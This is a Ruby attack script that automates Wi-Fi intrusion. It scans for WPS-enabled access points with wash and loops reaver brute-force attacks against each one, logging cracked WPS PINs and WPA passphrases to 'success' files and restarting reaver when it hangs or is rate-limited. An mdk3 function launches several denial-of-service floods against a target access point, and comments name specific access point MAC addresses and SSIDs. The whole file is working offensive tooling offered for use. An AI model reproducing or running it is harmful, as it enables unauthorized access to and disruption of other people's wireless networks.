require 'open3'
#on reboot stuff.

device=""
channel=""
ap_mac=""
essid=""
@device_list=["wlan1"]
@check=[]
#sleep 30 #sleep if you plan to start this script from startup.rc... give drives a chance to load
#`ifconfig wlan0 down`
#`iwconfig wlan0 mode monitor`
#`ifconfig wlan0 up`
`ifconfig wlan1 down`
`iwconfig wlan1 mode monitor`
`ifconfig wlan1 up`
#will not launch until the While true: at bottem
#reaver attack and log
def reaver(device, channel, ap_mac)
    Thread.start{
        #`ifconfig #{device} down`
        #`iwconfig #{device} mode monitor`
        #`ifconfig #{device} up`
        #puts "Random mac..."
        Open3.popen3("iwconfig #{device} channel #{channel}")
        puts "change #{channel}"
        Open3.popen3("ifconfig #{device} down")
        puts "down"
        #Open3.popen3("macchanger #{device} -r")
        puts "changemac"
        Open3.popen3("ifconfig #{device} up")
        puts "up"
        puts "reaver -i #{device} -vv -b #{ap_mac} -c #{channel}"
        Open3.popen3("reaver -i #{device} -vv -K 1 -b #{ap_mac} -c #{channel}"){|i,o,t,p|
            i.puts("y")  #tell reaver Yes to continue where the attack left off
            while line=o.gets
                if select([o],nil,nil,15)
                    puts "#{device} #{ap_mac}: #{line}"
                    log_all=File.open("log_all_#{ap_mac}",'a')
                    log_all.puts("#{device} #{ap_mac}: #{line}")
                    log_all.close

                    #100.00% complete
                    #Pin cracked in
                    #WPS PIN: '12345678'
                    #WPA PSK: 'asshole'
                    #AP SSID: 'noob'
                    # Log success to another file
                    if line.include?("100.00%") || line.include?("Pin cracked") || line.include?("WPS PIN:") || line.include?("WPA PSK:") || line.include?("AP SSID:")
                        success=File.open("sucess_#{ap_mac}",'a')
                        success.puts("#{device} #{ap_mac}: #{line}")
                        success.close
                    end

                    if line.include?("WARNING: Failed to associate") || line.include?("WARNING: 25 successive start failures") || line.include?("Detected AP rate limiting") || line.include?("WARNING: 10 failed connections in a row")
                        puts "#{device} #{ap_mac}:                       killing thread"
                        @check.delete(device)#remove the card from the list... can now be used in a new process
                        Process.kill("KILL",p.pid)
                    end
                else
                    puts "#{device} #{ap_mac}:                       TIMEOUT"
                    @check.delete(device)
                    Process.kill("KILL",p.pid)
                    break
                end

            end
            @check.delete(device)
            Process.kill("KILL",p.pid)
        }
        @check.delete(device)
        Process.kill("KILL",p.pid)
    } #thread.start

end





#will not launch until the While true: at bottem
def mdk3(device, channel, ap_mac, essid)
    Open3.popen3("iwconfig #{device} channel #{channel}")
    Thread.start{Open3.popen3("mdk3 #{device} b -n #{essid} -g -w -m -c #{channel}"){|i,o,t| while line=o.gets; puts line; end } }
    Thread.start{Open3.popen3("mdk3 #{device} a -i #{ap_mac} -m -s 1024"){|i,o,t| while line=o.gets; puts line; end } }
    Thread.start{Open3.popen3("mdk3 #{device} m -t #{ap_mac} -j -w 1 -n 1024 -s 1024"){|i,o,t| while line=o.gets; puts line; end } }
    Thread.start{Open3.popen3("mdk3 #{device} b -n #{essid} -g -w -m -c #{channel}"){|i,o,t| while line=o.gets; puts line; end } }
    Thread.start{Open3.popen3("mdk3 #{device} w -e #{essid} -c #{channel}"){|i,o,t| while line=o.gets; puts line; end } }
end #44:94:FC:3B:E9:16       7      ANDY DALTON SOUR HOUR
#28:C6:8E:A3:10:7A      11      NETGEAR01

#the main reason for this script
# if you let reaver run for to long, it may hang with out any data output (frozen state)... so killall and restart
#just added a few extra dos attacks

#reaver -i #{device} -vv --dh-small -b 20:76:00:1C:D9:C8 -c 6
#reaver -i wlan2 -vv --dh-small -b 4C:60:DE:31:C3:79 -c 8

def gather()
scan_complete=false
while scan_complete==false
    @device_list.each{|wlan|
        if not @check.include?(wlan)
            puts "#{wlan} scanning with wash"
            buff=""
            Open3.popen3("wash -i #{wlan} -C"){|i,o,t,p| Thread.start{sleep 25; Process.kill("KILL",p.pid)}; while line=o.gets; if not line.nil?; buff<<line; end; end}
            @list=[]
            buff.encode!('UTF-8', 'binary', invalid: :replace, undef: :replace, replace: '').each_line{|x| if x.include?("No"); @list<<"#{x.split[1]} #{x.split[0]}"; end; }
            puts @list
            scan_complete=true
            break
        else
            puts "waiting for device to free up... redo"
            sleep 3
            next
        end
    }
end
end





try_again=false
    while true
        gather()
        @list.each{|stack|
        #puts "trying #{stack}"
            sleep 1
            @device_list.each{|wlan|
            
                if not @check.include?(wlan)
                    puts @check
                    @check<<wlan
                    #reaver("wlan2",       "6",                 "20:76:00:1C:D9:C8")
                    reaver("#{wlan.chomp}","#{stack.split[0]}", "#{stack.split[1]}")

                    try_again=false
                    break
                else
                    try_again=true

                end
            }

            if try_again==true
                redo
            end
        }

    end
